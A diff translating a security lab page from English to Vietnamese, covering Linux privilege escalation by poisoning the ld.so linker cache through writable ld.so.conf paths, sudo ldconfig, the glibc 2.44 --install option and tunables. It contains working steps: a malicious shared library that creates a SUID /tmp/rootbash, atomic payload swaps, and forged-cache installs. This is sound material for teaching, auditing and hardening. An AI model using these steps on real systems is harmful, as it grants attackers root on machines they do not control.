@@ -1,12 +1,12 @@
-# ld.so privesc exploit example
+# Ví dụ exploit privesc ld.so
 
 {{#include ../../banners/hacktricks-training.md}}
 
-This page is a focused lab for poisoning the **system linker cache through `/etc/ld.so.conf` or `ldconfig`**. For missing-library injection, writable `RPATH`/`RUNPATH`, `LD_PRELOAD`, and other generic SUID linker abuse, see [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).
+Trang này là lab tập trung vào việc đầu độc **system linker cache thông qua `/etc/ld.so.conf` hoặc `ldconfig`**. Để tìm hiểu về việc chèn thư viện bị thiếu, `RPATH`/`RUNPATH` có quyền ghi, `LD_PRELOAD` và các kiểu lạm dụng linker SUID phổ biến khác, xem [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).
 
-## Prepare the environment
+## Chuẩn bị môi trường
 
-In the following section you can find the code of the files we are going to use to prepare the environment
+Trong phần sau, bạn có thể tìm thấy mã của các file sẽ dùng để chuẩn bị môi trường
 
 {{#tabs}}
 {{#tab name="sharedvuln.c"}}
@@ -48,14 +48,14 @@ void vuln_func()
 {{#endtab}}
 {{#endtabs}}
 
-1. **Create** those files in your machine in the same folder
-2. **Compile** the **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
-3. **Copy** `libcustom.so` to `/usr/lib` and refresh the cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
-4. **Compile** the **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`
+1. **Tạo** các file đó trên máy của bạn trong cùng thư mục
+2. **Biên dịch** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
+3. **Sao chép** `libcustom.so` vào `/usr/lib` và làm mới cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (cần quyền root)
+4. **Biên dịch** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`
 
-### Check the environment
+### Kiểm tra môi trường
 
-Check that _libcustom.so_ is being **loaded** from _/usr/lib_ and that you can **execute** the binary.
+Kiểm tra xem _libcustom.so_ có được **nạp** từ _/usr/lib_ hay không và bạn có thể **thực thi** binary hay không.
 
 ```
 $ ldd sharedvuln
@@ -69,9 +69,9 @@ Welcome to my amazing application!
 Hi
 ```
 
-### Useful triage commands
+### Các lệnh triage hữu ích
 
-When attacking a real target, verify the **exact library name** the binary needs, what the loader is **currently resolving**, and which configured paths are writable without mutating the live cache.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
+Khi tấn công một mục tiêu thực tế, hãy xác minh **tên thư viện chính xác** mà binary cần, loader **hiện đang phân giải** thư viện nào và những đường dẫn đã cấu hình nào có thể ghi được mà không làm thay đổi cache đang hoạt động.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
 
 ```bash
 # Needed SONAME and program interpreter
@@ -93,27 +93,21 @@ namei -l /home/ubuntu/lib
 /sbin/ldconfig -N -X -v 2>/dev/null
 ```
 
-Use `ldd` only on a **trusted** executable. Some implementations or unusual ELF interpreters can cause it to execute attacker-controlled code; `objdump -p ./file | grep NEEDED` safely lists direct dependencies. For a trusted target, invoking the discovered interpreter with `--list` shows actual resolution. Compare that output with `--inhibit-cache --list`: a difference proves that `/etc/ld.so.cache`, rather than an ordinary search-path rule, selected the object.<sup>[[1]](#references)[[4]](#references)</sup>
+Chỉ dùng `ldd` trên một executable **đáng tin cậy**. Một số cách triển khai hoặc ELF interpreter bất thường có thể khiến nó thực thi code do attacker kiểm soát; `objdump -p ./file | grep NEEDED` liệt kê an toàn các dependency trực tiếp. Với target đáng tin cậy, gọi interpreter đã tìm được cùng tùy chọn `--list` sẽ hiển thị cách phân giải thực tế. So sánh kết quả đó với `--inhibit-cache --list`: nếu khác nhau, điều đó chứng minh `/etc/ld.so.cache`, chứ không phải quy tắc search path thông thường, đã chọn object.<sup>[[1]](#references)[[4]](#references)</sup>
 
-A couple of useful gotchas:
+Một vài điểm dễ nhầm cần lưu ý:
 
-- `sudo echo ... > /etc/ld.so.conf.d/x.conf` usually **doesn't work** because
-  the redirection is done by your current shell. Use
-  `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` instead.
-- **SUID/privileged** binaries run in **secure-execution mode**: `LD_LIBRARY_PATH`
-  is ignored, while `LD_PRELOAD` is restricted (slash-containing names are
-  ignored, and only setuid-marked libraries in standard directories may be
-  preloaded). Once root runs `ldconfig`, directories listed in
-  `/etc/ld.so.conf` can enter `/etc/ld.so.cache`, so this misconfiguration can
-  still affect privileged programs.<sup>[[1]](#references)[[2]](#references)</sup>
-- `LD_DEBUG` is also ignored in secure-execution mode unless `/etc/suid-debug` exists, so collect its trace from an equivalent non-SUID run rather than expecting output from the privileged execution.<sup>[[1]](#references)</sup>
-- On glibc 2.33 and newer, the dynamic loader also exposes
-  `--list-diagnostics`, which prints machine-readable loader diagnostics and
-  built-in search-path information when a hijack doesn't behave as expected.<sup>[[1]](#references)[[6]](#references)</sup>
+- `sudo echo ... > /etc/ld.so.conf.d/x.conf` thường **không hoạt động** vì shell hiện tại của bạn thực hiện chuyển hướng. Thay vào đó, hãy dùng
+  `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
+- Các binary **SUID/đặc quyền** chạy ở **secure-execution mode**: `LD_LIBRARY_PATH`
+  bị bỏ qua, còn `LD_PRELOAD` bị giới hạn (các tên có dấu gạch chéo bị bỏ qua, và chỉ các library có bit setuid trong thư mục chuẩn mới có thể được preload). Khi root chạy `ldconfig`, các thư mục được liệt kê trong
+  `/etc/ld.so.conf` có thể được thêm vào `/etc/ld.so.cache`, vì vậy cấu hình sai này vẫn có thể ảnh hưởng đến các chương trình đặc quyền.<sup>[[1]](#references)[[2]](#references)</sup>
+- `LD_DEBUG` cũng bị bỏ qua trong secure-execution mode, trừ khi `/etc/suid-debug` tồn tại. Vì vậy, hãy thu thập trace từ một lần chạy không phải SUID tương đương, thay vì chờ kết quả từ lần thực thi có đặc quyền.<sup>[[1]](#references)</sup>
+- Trên glibc 2.33 trở lên, dynamic loader cũng cung cấp `--list-diagnostics`, tùy chọn này in ra các chẩn đoán của loader ở định dạng có thể đọc bằng máy và thông tin search path tích hợp sẵn khi hijack không hoạt động như dự kiến.<sup>[[1]](#references)[[6]](#references)</sup>
 
-### Cache and SONAME constraints
+### Ràng buộc về cache và SONAME
 
-`ldconfig` does not cache every arbitrary file in a configured directory: it examines ELF headers, recognizes names matching `lib*.so*` or `ld-*.so*`, and expects the conventional `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` chain. The injected object must therefore have the target architecture/class, the exact `DT_NEEDED` name (normally its `DT_SONAME`), and any symbols/versions the victim resolves.<sup>[[2]](#references)</sup>
+`ldconfig` không cache mọi file tùy ý trong một thư mục được cấu hình: nó kiểm tra ELF header, nhận diện các tên khớp với `lib*.so*` hoặc `ld-*.so*`, và yêu cầu chuỗi tên theo quy ước `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Vì vậy, object được chèn phải có đúng architecture/class của target, tên `DT_NEEDED` chính xác (thường là `DT_SONAME` của nó), cùng mọi symbol/version mà victim phân giải.<sup>[[2]](#references)</sup>
 
 ```bash
 readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
@@ -122,11 +116,11 @@ readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
 ldconfig -p | grep -F 'libcustom.so'
 ```
 
-Prefer a target-specific library such as this example. Shadowing a common SONAME with an incomplete object can break every process that resolves it before the intended privileged target runs.<sup>[[3]](#references)</sup>
+Ưu tiên một thư viện dành riêng cho mục tiêu, chẳng hạn như ví dụ này. Việc shadow một SONAME phổ biến bằng một object không đầy đủ có thể làm hỏng mọi tiến trình phân giải SONAME đó trước khi mục tiêu đặc quyền dự kiến chạy.<sup>[[3]](#references)</sup>
 
-### Cached-path persistence and atomic swaps
+### Duy trì đường dẫn trong cache và hoán đổi nguyên tử
 
-The cache records a **library name to pathname** mapping; it does not embed the shared object. After an attacker-controlled pathname is cached, replacing the object at that exact path affects newly started processes without another `ldconfig` run. This enables a useful time-of-check/time-of-use pattern: expose a valid library during an administrator's cache rebuild or inspection, then atomically rename the payload over it. Existing processes keep their already mapped object.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
+Cache ghi lại ánh xạ **tên thư viện sang đường dẫn**; nó không nhúng shared object vào đó. Sau khi một đường dẫn do kẻ tấn công kiểm soát được lưu vào cache, việc thay object tại đúng đường dẫn đó sẽ ảnh hưởng đến các tiến trình mới khởi chạy mà không cần chạy lại `ldconfig`. Điều này cho phép áp dụng một mô hình time-of-check/time-of-use hữu ích: cung cấp một thư viện hợp lệ trong lúc quản trị viên xây dựng lại hoặc kiểm tra cache, rồi dùng thao tác đổi tên nguyên tử để thay nó bằng payload. Các tiến trình đang chạy vẫn giữ object đã được ánh xạ vào bộ nhớ.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
 
 ```bash
 cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
@@ -134,20 +128,18 @@ cp ./payload.so "${cache_path}.new"
 mv -f "${cache_path}.new" "$cache_path"
 ```
 
-Likewise, deleting the malicious line from `ld.so.conf` does not evict an already written entry by itself: the administrator must remove the untrusted object, fix ownership/write access, and rebuild the cache. Use the `--inhibit-cache` comparison above to distinguish a stale cache entry from a still-active configuration path.<sup>[[1]](#references)[[2]](#references)</sup>
+Tương tự, xóa dòng độc hại khỏi `ld.so.conf` không tự loại bỏ mục đã được ghi trước đó: quản trị viên phải xóa đối tượng không đáng tin cậy, sửa quyền sở hữu/quyền ghi và xây dựng lại cache. Dùng phép so sánh `--inhibit-cache` ở trên để phân biệt mục cache cũ với đường dẫn cấu hình vẫn còn hoạt động.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ## Exploit
 
-In this scenario, suppose an administrator has added a vulnerable entry to a
-file under `/etc/ld.so.conf.d/` that is included by the system's
-`/etc/ld.so.conf`.<sup>[[1]](#references)[[2]](#references)</sup>
+Trong tình huống này, giả sử quản trị viên đã thêm một mục dễ bị tấn công vào một tệp trong `/etc/ld.so.conf.d/` được `/etc/ld.so.conf` của hệ thống đưa vào.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ```bash
 echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
 ```
 
-The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
-**Download and compile** the following code inside that path:
+Thư mục dễ bị tấn công là _/home/ubuntu/lib_ (nơi chúng ta có quyền ghi).\
+**Tải xuống và biên dịch** đoạn mã sau bên trong đường dẫn đó:
 
 ```c
 // gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c
@@ -165,17 +157,17 @@ void vuln_func(void){
 }
 ```
 
-If you expect **root** (or another privileged account) to execute the vulnerable binary later, it is usually better to leave a **root-owned artifact** instead of spawning an interactive shell. For example:
+Nếu dự đoán **root** (hoặc một tài khoản có đặc quyền khác) sẽ thực thi binary dễ bị tấn công sau này, thường nên để lại một **artifact do root sở hữu** thay vì khởi chạy shell tương tác. Ví dụ:
 
 ```c
 system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
 ```
 
-Then, after the privileged execution happens, you can use `/tmp/rootbash -p`.
+Sau khi quá trình thực thi với đặc quyền diễn ra, bạn có thể dùng `/tmp/rootbash -p`.
 
-Now that we have **created the malicious libcustom library inside the misconfigured** path, the default cache must be rebuilt by a successful privileged **`ldconfig`** run. A reboot helps only where the local boot process actually invokes it; otherwise wait for an administrator action or use an unsafe sudo rule if one is available.<sup>[[2]](#references)</sup>
+Giờ đây, chúng ta đã **tạo thư viện libcustom độc hại bên trong đường dẫn cấu hình sai**, cache mặc định phải được xây dựng lại bằng một lần chạy **`ldconfig`** với đặc quyền thành công. Khởi động lại chỉ có tác dụng khi quy trình khởi động cục bộ thực sự gọi lệnh này; nếu không, hãy đợi quản trị viên thực hiện thao tác đó hoặc dùng quy tắc sudo không an toàn nếu có.<sup>[[2]](#references)</sup>
 
-Once this has happened **recheck** where the `sharedvuln` executable is loading the `libcustom.so` library from:
+Sau khi việc này diễn ra, hãy **kiểm tra lại** vị trí mà executable `sharedvuln` đang tải thư viện `libcustom.so` từ:
 
 ```c
 $ldd sharedvuln
@@ -185,7 +177,7 @@ $ldd sharedvuln
 	/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
 ```
 
-As you can see it's **loading it from `/home/ubuntu/lib`** and if any user executes it, a shell will be executed:
+Như bạn có thể thấy, nó đang **tải thư viện từ `/home/ubuntu/lib`** và nếu bất kỳ người dùng nào thực thi nó, một shell sẽ được thực thi:
 
 ```c
 $ ./sharedvuln
@@ -196,11 +188,11 @@ ubuntu
 ```
 
 > [!TIP]
-> Note that in this example we haven't escalated privileges, but modifying the commands executed and **waiting for root or other privileged user to execute the vulnerable binary** we will be able to escalate privileges.
+> Lưu ý rằng trong ví dụ này, chúng ta chưa nâng quyền, nhưng bằng cách sửa đổi các lệnh được thực thi và **chờ root hoặc người dùng có đặc quyền khác thực thi binary dễ bị tấn công**, chúng ta sẽ có thể nâng quyền.
 
-### Modern `glibc-hwcaps` shadowing
+### Che khuất bằng `glibc-hwcaps` hiện đại
 
-Since glibc 2.33, the loader can prefer optimized libraries below `glibc-hwcaps/<level>/` inside **every library search directory**. Consequently, checking only `/home/ubuntu/lib` is insufficient: a writable compatible subdirectory such as `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` can shadow the base library after `ldconfig` indexes it, while other CPUs keep using the base object. This also provides an architecture-selective hijack that can be missed when validation occurs on a different CPU.<sup>[[1]](#references)[[3]](#references)</sup>
+Kể từ glibc 2.33, loader có thể ưu tiên các thư viện đã tối ưu nằm trong `glibc-hwcaps/<level>/` bên trong **mọi thư mục tìm kiếm thư viện**. Vì vậy, chỉ kiểm tra `/home/ubuntu/lib` là chưa đủ: một thư mục con tương thích có quyền ghi, chẳng hạn `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, có thể che khuất thư viện cơ sở sau khi `ldconfig` lập chỉ mục cho thư viện đó, trong khi các CPU khác vẫn sử dụng đối tượng cơ sở. Điều này cũng cho phép chiếm quyền có chọn lọc theo kiến trúc, vốn có thể bị bỏ sót khi việc xác thực được thực hiện trên một CPU khác.<sup>[[1]](#references)[[3]](#references)</sup>
 
 ```bash
 # The loader prints the supported levels in priority order
@@ -216,22 +208,22 @@ ldconfig -p | grep -F libcustom.so
 "$interp" --list ./sharedvuln | grep -F libcustom.so
 ```
 
-The current glibc hardening guidance recommends avoiding duplicate SONAMEs, non-default search locations, and objects in `glibc-hwcaps` subdirectories. From an audit perspective, apply ownership and writeability checks recursively to configured directories and their parent path components.<sup>[[3]](#references)</sup>
+Hướng dẫn hardening glibc hiện khuyến nghị tránh các SONAME trùng lặp, các vị trí tìm kiếm không mặc định và các đối tượng trong thư mục con `glibc-hwcaps`. Khi audit, hãy kiểm tra đệ quy quyền sở hữu và quyền ghi đối với các thư mục được cấu hình cùng các thành phần đường dẫn cha của chúng.<sup>[[3]](#references)</sup>
 
-### Other misconfigurations - Same vuln
+### Các cấu hình sai khác - Cùng vuln
 
-In the previous example we faked a misconfiguration where an administrator **set a non-privileged folder inside a configuration file inside `/etc/ld.so.conf.d/`**.\
-But there are other misconfigurations that can cause the same vulnerability: if you have **write permissions** in a loaded **config file**, can create a file in a writable `/etc/ld.so.conf.d/` directory, or can write to `/etc/ld.so.conf`, you can configure and exploit the same vulnerability.<sup>[[1]](#references)[[2]](#references)</sup>
+Trong ví dụ trước, chúng ta đã giả lập một cấu hình sai trong đó quản trị viên **đặt một thư mục không có đặc quyền bên trong một tệp cấu hình trong `/etc/ld.so.conf.d/`**.\
+Nhưng cũng có những cấu hình sai khác có thể gây ra cùng lỗ hổng: nếu bạn có **quyền ghi** vào một **tệp cấu hình** được tải, có thể tạo tệp trong thư mục `/etc/ld.so.conf.d/` có thể ghi, hoặc có thể ghi vào `/etc/ld.so.conf`, thì bạn có thể cấu hình và khai thác cùng lỗ hổng này.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ## Exploit 2
 
-**Suppose you have sudo privileges over `ldconfig`**. `ldconfig` accepts scan directories as positional arguments, so the shortest cache-poisoning form is often simply:<sup>[[2]](#references)</sup>
+**Giả sử bạn có đặc quyền sudo đối với `ldconfig`**. `ldconfig` chấp nhận các thư mục cần quét làm đối số vị trí, vì vậy cách thức cache-poisoning ngắn nhất thường chỉ đơn giản là:<sup>[[2]](#references)</sup>
 
 ```bash
 sudo ldconfig /tmp
 ```
 
-Alternatively, `-f` selects another configuration file while retaining the default cache output. This is useful when an argument filter blocks positional directories but still permits `-f`, or when several paths must be injected:<sup>[[2]](#references)</sup>
+Ngoài ra, `-f` chọn một tệp cấu hình khác trong khi vẫn giữ đầu ra cache mặc định. Cách này hữu ích khi bộ lọc đối số chặn các thư mục vị trí nhưng vẫn cho phép `-f`, hoặc khi cần chèn nhiều đường dẫn:<sup>[[2]](#references)</sup>
 
 ```bash
 cd /tmp
@@ -240,8 +232,8 @@ echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
 
-Now, as indicated in the **previous exploit**, **create the malicious library inside `/tmp`**.\
-And finally, lets load the path and check where is the binary loading the library from:
+Giờ đây, như đã đề cập trong **exploit trước đó**, hãy **tạo thư viện độc hại bên trong `/tmp`**.\
+Và cuối cùng, hãy nạp đường dẫn rồi kiểm tra binary đang tải thư viện từ đâu:
 
 ```bash
 # -f changes the input configuration; the default output is still /etc/ld.so.cache
@@ -254,11 +246,11 @@ ldd sharedvuln
 	/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
 ```
 
-**As you can see, having sudo privileges over `ldconfig` you can exploit the same vulnerability.** The option details matter when assessing a constrained sudo rule: `-f` selects another configuration but still rebuilds `/etc/ld.so.cache`; `-C` redirects the cache elsewhere; `-N` prevents cache rebuilding; and `-X` prevents link updates but **still rebuilds the cache unless combined with `-N`**. `-n` implies `-N`, so it can update links in supplied directories but cannot poison the cache; `-r` operates below an alternate root and normally does not change the host cache.<sup>[[2]](#references)</sup>
+**Như bạn có thể thấy, nếu có quyền sudo đối với `ldconfig`, bạn có thể khai thác cùng lỗ hổng này.** Chi tiết về các tùy chọn rất quan trọng khi đánh giá một quy tắc sudo bị giới hạn: `-f` chọn một tệp cấu hình khác nhưng vẫn dựng lại `/etc/ld.so.cache`; `-C` chuyển hướng cache sang nơi khác; `-N` ngăn việc dựng lại cache; còn `-X` ngăn cập nhật liên kết nhưng **vẫn dựng lại cache, trừ khi được dùng cùng `-N`**. `-n` ngầm bao gồm `-N`, nên tùy chọn này có thể cập nhật liên kết trong các thư mục được cung cấp nhưng không thể làm nhiễm độc cache; `-r` hoạt động bên dưới một root thay thế và thường không thay đổi cache của host.<sup>[[2]](#references)</sup>
 
-### glibc 2.44: installing a prebuilt cache
+### glibc 2.44: cài đặt cache dựng sẵn
 
-Glibc 2.44 added `ldconfig --install SOURCE`, which atomically copies a prebuilt cache to the selected cache destination (the host `/etc/ld.so.cache` unless `-C` or `-r` changes it). This creates another dangerous argument for sudoers rules and privileged wrappers: an attacker can construct a valid cache **without privileges**, then use the permitted `--install` invocation to replace the system cache. The install path checks the cache magic but does not regenerate its entries from trusted configuration.<sup>[[9]](#references)[[10]](#references)</sup>
+Glibc 2.44 bổ sung `ldconfig --install SOURCE`, tùy chọn này sao chép nguyên tử một cache dựng sẵn đến đích cache đã chọn (mặc định là `/etc/ld.so.cache` của host, trừ khi `-C` hoặc `-r` thay đổi đích). Điều này tạo thêm một tham số nguy hiểm cho các quy tắc sudoers và wrapper có đặc quyền: kẻ tấn công có thể tạo một cache hợp lệ **mà không cần đặc quyền**, rồi dùng lệnh `--install` được cho phép để thay thế cache hệ thống. Đường dẫn cài đặt kiểm tra magic của cache nhưng không tạo lại các mục trong cache từ cấu hình đáng tin cậy.<sup>[[9]](#references)[[10]](#references)</sup>
 
 ```bash
 # Build a valid cache as the unprivileged user. -X avoids changing symlinks.
@@ -271,13 +263,13 @@ sudo /sbin/ldconfig --install /tmp/evil.ld.so.cache
 "$interp" --list ./sharedvuln | grep -F libcustom.so
 ```
 
-The cache still contains **pathnames**, not library bytes, so `/tmp/libcustom.so` must remain present and compatible when the victim starts. Filters that merely reject `-f`, positional directories, or `-t` are therefore incomplete on glibc 2.44: reject `--install`/`-I` too, or preferably do not delegate `ldconfig` at all.<sup>[[9]](#references)[[10]](#references)</sup>
+Cache vẫn chứa **đường dẫn**, không phải byte của thư viện, vì vậy `/tmp/libcustom.so` phải còn tồn tại và tương thích khi chương trình mục tiêu khởi chạy. Trên glibc 2.44, các bộ lọc chỉ từ chối `-f`, thư mục dạng đối số vị trí hoặc `-t` là chưa đủ: hãy từ chối cả `--install`/`-I`, hoặc tốt nhất là không ủy quyền chạy `ldconfig`.<sup>[[9]](#references)[[10]](#references)</sup>
 
-## glibc 2.44: cached system-wide tunables
+## glibc 2.44: tunables toàn hệ thống được lưu trong cache
 
-Starting with glibc 2.44, `ldconfig` also parses `/etc/tunables.conf` and stores its settings as an extension in `/etc/ld.so.cache`. The file accepts `include` directives and per-process filters. Prefixes control scope: `@`/`onlysecure` targets only `AT_SECURE` processes, `$`/`nonsecure` excludes them, and `*`/`anysecure` covers both. **An unprefixed entry defaults to non-secure processes**, so an attacker must explicitly use `@` or `*` to influence setuid, setgid, or capability-elevated programs. This expands the audit boundary beyond library directories: writable tunables configuration or an included file can influence future program startups after a privileged cache rebuild.<sup>[[7]](#references)[[9]](#references)</sup>
+Kể từ glibc 2.44, `ldconfig` cũng phân tích `/etc/tunables.conf` và lưu các thiết lập của nó dưới dạng phần mở rộng trong `/etc/ld.so.cache`. Tệp này chấp nhận chỉ thị `include` và bộ lọc theo từng tiến trình. Các tiền tố kiểm soát phạm vi: `@`/`onlysecure` chỉ áp dụng cho tiến trình `AT_SECURE`, `$`/`nonsecure` loại trừ chúng, còn `*`/`anysecure` áp dụng cho cả hai. **Mục không có tiền tố mặc định áp dụng cho tiến trình không an toàn**, vì vậy kẻ tấn công phải dùng rõ ràng `@` hoặc `*` để tác động đến các chương trình setuid, setgid hoặc được nâng quyền bằng capability. Điều này mở rộng phạm vi kiểm tra vượt ra ngoài các thư mục thư viện: cấu hình tunables có thể ghi được hoặc tệp được include có thể tác động đến những lần khởi chạy chương trình sau này, sau khi cache được xây dựng lại với quyền đặc biệt.<sup>[[7]](#references)[[9]](#references)</sup>
 
-The same release adds `ldconfig -t TUNCONF`, which selects an alternate tunables file while still writing the normal cache unless another option changes it. Therefore, wrappers and sudo rules that attempted to block only `-f` must also reject `-t`, arbitrary positional directories, `--install`, and cache-output manipulation.<sup>[[7]](#references)[[8]](#references)[[10]](#references)</sup>
+Bản phát hành này cũng bổ sung `ldconfig -t TUNCONF`, cho phép chọn một tệp tunables thay thế trong khi vẫn ghi vào cache thông thường, trừ khi có tùy chọn khác thay đổi hành vi đó. Vì vậy, các wrapper và quy tắc sudo chỉ chặn `-f` cũng phải từ chối `-t`, thư mục vị trí tùy ý, `--install` và thao tác thay đổi đầu ra cache.<sup>[[7]](#references)[[8]](#references)[[10]](#references)</sup>
 
 ```bash
 # Detection / lab-only proof of cache influence
@@ -290,9 +282,9 @@ sudo ldconfig -t /tmp/evil.tunconf
 sudo ldconfig                         # rebuild from the real configuration
 ```
 
-### Target-selective tunables
+### Tunable chọn lọc mục tiêu
 
-The `[proc:PATTERN]` filter applies the following entries only when the executable's full `/proc/self/exe` path (if `PATTERN` starts with `/`) or basename matches. A filter ends at the next filter, `[]`, the end of the file, or an include-file boundary. This makes a poisoned cache less noisy because the altered behavior can be restricted to one privileged victim.<sup>[[7]](#references)</sup>
+Bộ lọc `[proc:PATTERN]` chỉ áp dụng các mục sau khi đường dẫn `/proc/self/exe` đầy đủ của tệp thực thi (nếu `PATTERN` bắt đầu bằng `/`) hoặc tên cơ sở của tệp khớp. Bộ lọc kết thúc tại bộ lọc tiếp theo, `[]`, cuối tệp hoặc ranh giới của tệp include. Điều này giúp cache bị đầu độc ít gây chú ý hơn vì hành vi bị thay đổi có thể chỉ giới hạn ở một nạn nhân có đặc quyền.<sup>[[7]](#references)</sup>
 
 ```ini
 # Affect only this AT_SECURE executable; "-" also forbids env overrides.
@@ -301,22 +293,22 @@ The `[proc:PATTERN]` filter applies the following entries only when the executab
 []
 ```
 
-The `-`/`nonoverridable` prefix prevents `GLIBC_TUNABLES` from overriding a cached value; `+`/`overridable` restores the normal override behavior. For `AT_SECURE` processes the environment variable is ignored entirely anyway. Treat the file format as version-specific—the glibc project does not promise it as a stable interface—and enumerate supported names and values with `"$interp" --list-tunables` before attempting a targeted effect.<sup>[[7]](#references)[[9]](#references)</sup>
+Tiền tố `-`/`nonoverridable` ngăn `GLIBC_TUNABLES` ghi đè giá trị đã lưu trong cache; `+`/`overridable` khôi phục hành vi ghi đè thông thường. Dù sao, biến môi trường này hoàn toàn bị bỏ qua đối với các tiến trình `AT_SECURE`. Hãy xem định dạng tệp là phụ thuộc vào từng phiên bản—dự án glibc không cam kết đây là giao diện ổn định—và liệt kê các tên cùng giá trị được hỗ trợ bằng `"$interp" --list-tunables` trước khi thử tạo hiệu ứng nhắm mục tiêu.<sup>[[7]](#references)[[9]](#references)</sup>
 
-This is not automatically arbitrary code execution. It is a privileged **loader-behavior manipulation** primitive: glibc explicitly warns that system-wide values can apply security-sensitive tunables to setuid/setgid programs without per-tunable security screening. Look for target-specific allocator changes, CPU-hardening changes, or denial-of-service conditions rather than assuming a universal payload.<sup>[[7]](#references)</sup>
+Điều này không tự động dẫn đến thực thi mã tùy ý. Đây là một primitive **thao túng hành vi của loader** với đặc quyền: glibc cảnh báo rõ rằng các giá trị trên toàn hệ thống có thể áp dụng những tunable nhạy cảm về bảo mật cho chương trình setuid/setgid mà không qua bước sàng lọc bảo mật riêng cho từng tunable. Hãy tìm những thay đổi allocator cụ thể cho mục tiêu, thay đổi tăng cường bảo mật CPU hoặc tình trạng từ chối dịch vụ, thay vì mặc định rằng có một payload dùng được cho mọi trường hợp.<sup>[[7]](#references)</sup>
 
 
 
 ## References
 
-- [1] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
-- [2] [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
-- [3] [Dynamic Linker Hardening - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
-- [4] [ldd(1) - Linux manual page](https://man7.org/linux/man-pages/man1/ldd.1.html)
-- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
-- [6] [Dynamic Linker Diagnostics (The GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
-- [7] [System-wide Tunables (The GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
-- [8] [Add system-wide tunables: ldconfig part (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
-- [9] [The GNU C Library version 2.44 is now available](https://sourceware.org/pipermail/libc-alpha/2026-July/179159.html)
-- [10] [glibc 2.44 ldconfig source](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/ldconfig.c;hb=glibc-2.44)
+- [1] [ld.so(8) - Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
+- [2] [ldconfig(8) - Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
+- [3] [Tăng cường bảo mật Dynamic Linker - Thư viện GNU C](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
+- [4] [ldd(1) - Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
+- [5] [readelf (Tiện ích nhị phân GNU)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
+- [6] [Chẩn đoán Dynamic Linker (Thư viện GNU C)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
+- [7] [Tunables trên toàn hệ thống (Thư viện GNU C 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
+- [8] [Thêm tunables trên toàn hệ thống: phần ldconfig (bản vá v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
+- [9] [Thư viện GNU C phiên bản 2.44 hiện đã có](https://sourceware.org/pipermail/libc-alpha/2026-July/179159.html)
+- [10] [Mã nguồn ldconfig của glibc 2.44](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/ldconfig.c;hb=glibc-2.44)
 {{#include ../../banners/hacktricks-training.md}}
